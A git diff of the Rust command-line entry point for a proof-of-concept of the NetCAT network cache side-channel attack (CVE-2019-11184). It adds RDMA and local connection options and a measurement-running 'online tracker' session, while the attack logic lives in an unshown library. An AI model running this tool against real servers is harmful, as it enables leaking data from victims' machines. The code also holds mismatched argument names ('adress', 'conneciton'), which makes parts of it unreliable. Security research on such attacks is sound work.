@@ -2,8 +2,20 @@ use clap::{crate_authors, crate_version, App, Arg};
 use std::net::IpAddr;
 use std::str::FromStr;
 
+const DEFAULT_PORT: &str = "9003";
+
 fn main() {
-    let matches = App::new("NetCAT PoC")
+    let matches = app_cli_config().get_matches();
+
+    if matches.is_present("interactive") {
+        interactive::run_session(matches);
+    } else {
+        uninteractive::run_session(matches);
+    }
+}
+
+fn app_cli_config<'a, 'b>() -> App<'a, 'b> {
+    App::new("NetCAT PoC")
         .version(crate_version!())
         .author(crate_authors!())
         .about("Implementation of the Network Cache Attack (CVE-2019-11184)")
@@ -13,7 +25,8 @@ fn main() {
                 .short("c")
                 .value_name("CONNECTION_TYPE")
                 .possible_values(&["rdma", "local"])
-                .help("Sets the connection type")
+                .default_value("rdma")
+                .help("Sets the connection type"),
         )
         .arg(
             Arg::with_name("adress")
@@ -21,38 +34,82 @@ fn main() {
                 .long("addr")
                 .short("a")
                 .takes_value(true)
-                .required_if("conneciton", "rdma")
+                .required_if("connection", "rdma")
                 .value_name("IP_ADDR")
                 .validator(|x| match IpAddr::from_str(x.as_str()) {
                     Ok(_) => Ok(()),
                     Err(_) => Err(String::from("Faulty IP adress")),
-                })
+                }),
         )
-        .arg(Arg::from_usage(
-            "[interactive] -i --interactive 'Sets the program into interactive mode'",
-        ))
-        .arg(Arg::with_name("output").help("A file to dump gathered data to"))
-        .get_matches();
+        .arg(
+            Arg::with_name("port")
+                .help("Victim server port to be used for control packets")
+                .long("port")
+                .short("p")
+                .takes_value(true)
+                .required_if("conneciton", "rdma")
+                .value_name("PORT")
+                .default_value(DEFAULT_PORT)
+                .validator(|x| match x.parse::<u16>() {
+                    Ok(_) => Ok(()),
+                    Err(_) => Err(String::from("Faulty port")),
+                }),
+        )
+        .arg_from_usage("[quite] -q --quite 'Does not disturb anyone by the output'")
+        .arg_from_usage("[interactive] -i --interactive 'Sets the program into interactive mode'")
+        .arg_from_usage("[output] 'Output file to dump data to'")
+}
 
-    if matches.is_present("interactive") {
-        interactive::run_session(matches);
-    } else {
-        uninteractive::run_session(matches);
+mod uninteractive {
+    use clap::ArgMatches;
+    use console::style;
+    use get_if_addrs::get_if_addrs;
+    use netcat::connection::{local::LocalMemoryConnector, rdma::RdmaServerConnector};
+    use netcat::online_tracker;
+    pub fn run_session(args: ArgMatches) {
+        let mut tracker;
+
+        let quite = args.is_present("quite");
+        let port = args.value_of("port").unwrap().parse::<u16>().unwrap();
+        // NOTE Unwraping is ok as we have a default value
+        if args.value_of("connection").unwrap() == "rdma" {
+            // these are required for rdma and validated
+            let ip = args.value_of("address").unwrap();
+            let conn = Box::new(RdmaServerConnector::new((ip, port)));
+            tracker = online_tracker::OnlineTracker::new(ip, conn, quite).unwrap();
+        } else {
+            // this is a local scenario
+            // but we still need an address for synchronization
+            let addr = get_if_addrs()
+                .expect("ERROR: Could not get machine network interfaces")
+                .into_iter()
+                .filter(|i| !i.is_loopback())
+                .next()
+                .expect("ERROR: no network interface found")
+                .ip();
+            let conn = Box::new(LocalMemoryConnector::new());
+            tracker = online_tracker::OnlineTracker::new((addr, port), conn, quite).unwrap();
+        }
+        if let Err(e) = tracker.track() {
+            if !quite {
+                println!(
+                    "Online Tracker: {}",
+                    style(e).red()
+                );
+            }
+        }
+        if !quite {
+            println!(
+                "Online Tracker: {}",
+                style("MEASUREMENTS COMPLETED").green()
+            );
+        }
     }
 }
 
 mod interactive {
     use clap::ArgMatches;
-
-    pub fn run_session(args: ArgMatches) {
+    pub fn run_session(_args: ArgMatches) {
         println!("I am interactive");
-    }
-}
-
-mod uninteractive {
-    use clap::ArgMatches;
-
-    pub fn run_session(args: ArgMatches) {
-        println!("I am uninteractive");
     }
 }
